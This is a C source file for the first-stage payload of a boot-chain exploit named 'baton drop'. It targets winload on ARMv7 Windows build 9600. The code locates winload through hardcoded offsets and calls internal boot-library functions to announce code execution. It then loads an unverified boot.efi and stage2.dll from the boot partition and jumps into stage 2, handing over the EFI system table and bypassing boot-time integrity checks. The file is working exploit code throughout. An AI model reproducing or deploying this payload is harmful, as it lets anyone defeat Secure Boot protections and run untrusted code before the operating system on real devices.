// Bring in NT stuff first
#define _ARM_
#define _WIN32_WINNT 0x0603
#define UMDF_USING_NTSTATUS
#include <minwindef.h> // fixes up typedefs and includes winnt.h
#include <ntstatus.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#include <stdbool.h>
#include <stdint.h>
#include <stddef.h>

#include <intrin.h>

// Bring in EFI defs
#define EFI_NT_EMUL // we're going to get LIST_ENTRY from NT
typedef LIST_ENTRY EFI_LIST_ENTRY;
#include "efi.h"


static inline __forceinline void WaitForInterrupt() {
	#if defined(_M_X64) || defined(_M_IX86)
	__halt();
	#elif defined(_M_ARM) || defined(_M_ARM64)
	__wfi();
	#else
	#error "Unsupported architecture"
	#endif
}

static inline __forceinline void InfLoop() {
	while (1) WaitForInterrupt();
}

typedef NTSTATUS (*tfpBlDisplayPrintString)(CHAR16* Format, ...);
typedef void (*tfpBlDisplayClearScreen)();

typedef struct _BOOT_ENVIRONMENT_DEVICE *PBOOT_ENVIRONMENT_DEVICE;

typedef void (*tfpBlpArchSwitchContext)(DWORD type);

typedef struct _STAGE2_ENTRY_BLOCK {
	EFI_HANDLE ImageHandle;
	EFI_SYSTEM_TABLE* SystemTable;
	tfpBlpArchSwitchContext BlpArchSwitchContext;
	PVOID Stage2Base;
	PVOID PayloadBase;
} STAGE2_ENTRY_BLOCK;

typedef NTSTATUS (*tfpBlImgLoadPEImageEx)(
        unsigned int DeviceId,
        unsigned int MemoryType,
        wchar_t *LoadFile,
        void **ImageBase,
        size_t *ImageSize,
        unsigned __int8 *ImageHash,
        unsigned int *ImageHashLength,
        unsigned int *ImageHashAlgorithm,
        unsigned int PreferredAttributes,
        unsigned int PreferredAlignment,
        unsigned int Flags,
        unsigned int *LoadInformation,
        void *BootTrustedBootInformation);

typedef NTSTATUS (*tfpBlDeviceOpen)(PBOOT_ENVIRONMENT_DEVICE Device, DWORD Flags, DWORD* idDevice);

typedef void (*tfpStage2Entry)(STAGE2_ENTRY_BLOCK Context);

// Export a function for hal.dll to import.
__declspec(dllexport) void _() {}

static inline size_t THUMB_OFFSET(size_t x) { return x | 1; }

static inline DWORD IMAGE_FLAGS_EFI() {
	return 1; // allocate 1:1 physical memory
}

static inline DWORD IMAGE_FLAGS() {
	return IMAGE_FLAGS_EFI() | 2; // check machine type
}

NTSTATUS PocMain(void** FunctionTableOut, void** FunctionTableIn) {
	// Get a function from the table, and calculate the PE base.
	size_t Function = (size_t) FunctionTableIn[1];
	size_t PeBase = Function - THUMB_OFFSET(0x981c); // winload 9600.16384
	uint8_t* pPeBase = (uint8_t*)PeBase;
	// make sure, although how did we even execute otherwise?
	if (pPeBase[0] != 'M' || pPeBase[1] != 'Z') InfLoop();

	// Clear the screen.
	tfpBlDisplayClearScreen BlDisplayClearScreen = (tfpBlDisplayClearScreen) (PeBase + THUMB_OFFSET(0x21224));
	BlDisplayClearScreen();
	
	// Announce our presence.
	tfpBlDisplayPrintString BlDisplayPrintString = (tfpBlDisplayPrintString) (PeBase + THUMB_OFFSET(0x20c90));
	BlDisplayPrintString(L"baton drop: got code execution [ARMv7]\n");
	
	// Load our binaries (stage 2, final payload)
	tfpBlDeviceOpen BlDeviceOpen = (tfpBlDeviceOpen) (PeBase + THUMB_OFFSET(0x117f0));
	tfpBlImgLoadPEImageEx BlImgLoadPEImageEx = (tfpBlImgLoadPEImageEx) (PeBase + THUMB_OFFSET(0x30ef4));
	PBOOT_ENVIRONMENT_DEVICE BootDevice = *(PBOOT_ENVIRONMENT_DEVICE*)(PeBase + 0xDB844);
	DWORD hDeviceBoot;
	NTSTATUS Status = BlDeviceOpen(BootDevice, 3, &hDeviceBoot);
	if (!NT_SUCCESS(Status)) {
		BlDisplayPrintString(L"Could not open boot device: 0x%08x\n", Status);
		InfLoop();
	}
	PVOID ImageBase;
	size_t ImageSize;
	Status = BlImgLoadPEImageEx(hDeviceBoot, 0xD0000002, L"\\boot.efi", &ImageBase, &ImageSize, NULL, NULL, NULL, 0, 0, IMAGE_FLAGS_EFI(), NULL, NULL);
	if (!NT_SUCCESS(Status)) {
		BlDisplayPrintString(L"Could not load efiesp:\\boot.efi : 0x%08x\n", Status);
		InfLoop();
	}
	// Ensure that PE subsystem and machine values look good.
	{
		PIMAGE_DOS_HEADER Mz = (PIMAGE_DOS_HEADER)ImageBase;
		PIMAGE_NT_HEADERS Pe = (PIMAGE_NT_HEADERS)((size_t)ImageBase + Mz->e_lfanew);
		USHORT Subsystem = Pe->OptionalHeader.Subsystem;
		if (Subsystem < IMAGE_SUBSYSTEM_EFI_APPLICATION || Subsystem > IMAGE_SUBSYSTEM_EFI_ROM) {
			BlDisplayPrintString(L"efiesp:\\boot.efi has incorrect subsystem value %d (expected: 10-13)\n", Subsystem);
			InfLoop();
		}
		USHORT Machine = Pe->FileHeader.Machine;
		if (Machine != IMAGE_FILE_MACHINE_THUMB && Machine != IMAGE_FILE_MACHINE_ARMNT) {
			BlDisplayPrintString(L"efiesp:\\boot.efi has incorrect machine value 0x%04x (expected 0x01c2(THUMB) or 0x01c4(ARMNT))\n", Machine);
			InfLoop();
		}
	}
	// Load stage 2.
	PVOID Stage2ImageBase;
	size_t Stage2ImageSize;
	Status = BlImgLoadPEImageEx(hDeviceBoot, 0xD0000002, L"\\stage2.dll", &Stage2ImageBase, &Stage2ImageSize, NULL, NULL, NULL, 0, 0, IMAGE_FLAGS(), NULL, NULL);
	if (!NT_SUCCESS(Status)) {
		BlDisplayPrintString(L"Could not load efiesp:\\stage2.dll : 0x%08x\n", Status);
		InfLoop();
	}
	
	// Clear screen again before we jump to stage 2.
	BlDisplayClearScreen();
	
	// Get everything we need and jump to stage 2.
	STAGE2_ENTRY_BLOCK Context;
	Context.Stage2Base = Stage2ImageBase;
	Context.PayloadBase = ImageBase;
	Context.BlpArchSwitchContext = (tfpBlpArchSwitchContext)(PeBase + THUMB_OFFSET(0x1020c));
	Context.ImageHandle = *(EFI_HANDLE*)(PeBase + 0xDFA04);
	Context.SystemTable = *(EFI_SYSTEM_TABLE**)(PeBase + 0xDFA5C);
	PIMAGE_DOS_HEADER Mz = (PIMAGE_DOS_HEADER)Stage2ImageBase;
	PIMAGE_NT_HEADERS Pe = (PIMAGE_NT_HEADERS)((size_t)Stage2ImageBase + Mz->e_lfanew);
	tfpStage2Entry Stage2Entry = ((size_t)Stage2ImageBase + Pe->OptionalHeader.AddressOfEntryPoint);
	Stage2Entry(Context);
	
	
	
	// We don't want to return back to the boot application.
	InfLoop();
	return STATUS_NOT_SUPPORTED;
}